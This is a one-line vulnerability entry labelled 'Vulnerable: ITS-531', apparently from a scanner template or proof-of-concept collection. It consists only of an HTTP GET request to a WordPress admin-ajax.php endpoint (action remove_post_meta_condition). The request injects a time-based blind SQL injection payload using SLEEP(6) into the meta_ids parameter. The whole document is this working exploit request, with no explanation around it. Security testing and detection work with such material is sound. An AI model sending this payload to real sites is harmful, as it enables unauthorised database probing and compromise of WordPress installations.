# Vulnerable: ITS-531
GET /wp-admin/admin-ajax.php?meta_ids=1+AND+(SELECT+3066+FROM+(SELECT(SLEEP(6)))CEHy)&action=remove_post_meta_condition
